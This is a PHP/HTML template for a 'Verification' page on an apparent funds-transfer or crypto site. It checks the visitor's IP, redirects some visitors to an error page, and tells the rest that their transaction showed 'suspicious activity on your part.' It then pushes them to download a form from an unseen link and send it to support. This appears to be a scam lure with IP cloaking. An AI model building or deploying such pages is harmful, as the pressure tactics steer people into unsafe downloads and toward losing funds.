<!DOCTYPE html>
<html lang="en">

<?php
include('../layout/en/head.php');
include('../vender/logic.php');
$block = check_ip();
if ($block == false) {
    header('Location: ' . 'en/error.php');
}
?>

<body>

    <div class="wrapper">
        <div class="preloader">
            <div class="preloader__loader"></div>
        </div>
        <?php
        session_start();
        if (isset($_SESSION['email'])) {
            include('../layout/en/header_reg.php');
        } else {
            include('../layout/en/header.php');
        }
        ?>
        <main class="main">
            <section class="verification">
                <div class="container verification__container">
                <div class="verification__start wow animate__fadeInLeft" data-wow-delat=".25s">
                         <h1 class="title verification_title">
                             Verification
                         </h1>
                         <h2 class="title verification__subtitle">
                             Fill the form
                         </h2>
                         <p class="verification_text">
                             Your transaction has been subject to suspicious activity on your part. Please,
                             fill out the document by downloading it using the button below, then send it to technical support
                             project
                         </p>
                         <a class="btn btn_background_blue mt-20" href="<?php echo verification_link;?>">Download form</a>
                         <div class="verification_info">
                             These actions must be performed to confirm the safety of the movement of your funds
                         </div>
                     </div>
                    <div class="verification__end wow animate__fadeInRight" data-wow-delat=".25s">
                        <div class="shapes-tg verification__shapes-tg">
                            <img class="shapes-tg__img shapes-tg__img_1 verification__shapes-tg-img_1" src="../img/shapes-tg/1.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_2 verification__shapes-tg-img_2" src="../img/shapes-tg/2.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_3 verification__shapes-tg-img_3" src="../img/shapes-tg/3.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_4 verification__shapes-tg-img_4" src="../img/shapes-tg/4.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_5 verification__shapes-tg-img_5" src="../img/shapes-tg/5.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_6 verification__shapes-tg-img_6" src="../img/shapes-tg/4.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_7 verification__shapes-tg-img_7" src="../img/shapes-tg/6.png" alt="shape">
                        </div>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <script src="../js/libs/jquery-3.6.1.min.js"></script>
    <script src="../js/libs/wow.min.js"></script>
    <script src="../js/script.js"></script>
</body>

</html>